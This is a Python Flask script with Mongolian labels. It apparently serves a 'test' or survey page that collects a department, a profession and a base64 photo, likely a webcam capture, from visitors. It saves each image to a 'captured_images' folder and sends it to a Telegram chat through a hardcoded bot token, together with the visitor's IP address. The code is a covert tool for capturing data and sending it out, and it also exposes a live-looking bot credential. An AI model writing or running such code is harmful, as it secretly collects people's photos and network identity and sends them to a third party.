import requests
import base64
import os
import time
from flask import Flask, request, jsonify, render_template, redirect, url_for

# Тохиргоо
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8476306576:AAFIzHzOLDQR_qOKb5yn4eK6VsMmIrGdy_Q')
CHAT_ID = os.environ.get('CHAT_ID', '-5036234831')
UPLOAD_FOLDER = 'captured_images'

app = Flask(__name__)

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def send_telegram_media_notification(message_text, image_filepath=None):
    if image_filepath and os.path.exists(image_filepath):
        url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto'
        payload = {'chat_id': CHAT_ID, 'caption': message_text, 'parse_mode': 'Markdown'}
        with open(image_filepath, 'rb') as photo:
            files = {'photo': photo}
            try:
                r = requests.post(url, data=payload, files=files)
                r.raise_for_status()
            except Exception as e:
                print(f"Error: {e}")
    else:
        url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        payload = {'chat_id': CHAT_ID, 'text': message_text, 'parse_mode': 'Markdown'}
        try:
            r = requests.post(url, json=payload)
            r.raise_for_status()
        except Exception as e:
            print(f"Error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/success')
def success():
    return "<h1>Амжилттай илгээгдлээ.</h1>"

@app.route('/submit', methods=['POST'])
def submit():
    role = request.form.get('role_department', 'Unknown')
    prof = request.form.get('profession', 'Unknown')
    photo_data = request.form.get('photo_data', '')
    
    image_path = None
    if photo_data and ',' in photo_data:
        try:
            encoded_data = photo_data.split(',')[1]
            decoded = base64.b64decode(encoded_data)
            filename = f"img_{int(time.time())}.jpg"
            image_path = os.path.join(UPLOAD_FOLDER, filename)
            with open(image_path, 'wb') as f:
                f.write(decoded)
        except:
            image_path = None

    msg = f"📋 ШИНЭ ТЕСТ:\n👤 Хэлтэс: {role}\n💼 Мэргэжил: {prof}\n📍 IP: {request.remote_addr}"
    send_telegram_media_notification(msg, image_path)
    return redirect(url_for('success'))

if __name__ == '__main__':
    app.run(port=8080)